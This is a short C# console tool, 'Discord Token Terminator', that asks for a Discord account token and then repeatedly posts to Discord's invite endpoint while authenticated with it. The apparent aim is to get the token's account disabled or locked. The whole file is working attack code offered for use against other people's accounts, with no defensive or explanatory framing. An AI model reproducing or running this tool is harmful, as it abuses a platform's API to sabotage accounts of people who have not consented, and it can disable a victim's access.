using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using Discord;
using Discord.Gateway;
using Leaf.xNet;

namespace TokenTerminator
{
	class Program
	{
		static void Main(string[] args)
		{
			start:
			Console.Clear();
			Console.Title = "Discord Token Terminator - Made By (BabiKoqi)";
			Console.Write("Whats The Token You Want To Terminate: ");
			string token = Console.ReadLine();
			DiscordClient client = new DiscordClient();
		    try
			{
				client.Token = token;
			}
			catch (Exception)
			{
				Console.WriteLine("The Token Is Invalid");
				Console.ReadLine();
				goto start;
			}
			Console.WriteLine("Are You Sure You Want To Terminate The Token (ENTER to continue)");
			Console.ReadLine();
			Console.WriteLine("Getting Prepared For Termination...");

			using (HttpRequest req = new HttpRequest())
			{
				for (int i = 0; i < 30; i++)
				{
					try
					{
						req.AddHeader("Authorization", token);
						req.Post("https://discordapp.com/api/v6/invite/minecraft");
						client.Token = token;
					}

					catch (Exception)
					{
						Console.WriteLine("Token Got Succesfully Terminated");
						Console.ReadLine();
						Environment.Exit(0);
					}
				}
			}
		}
	}
}
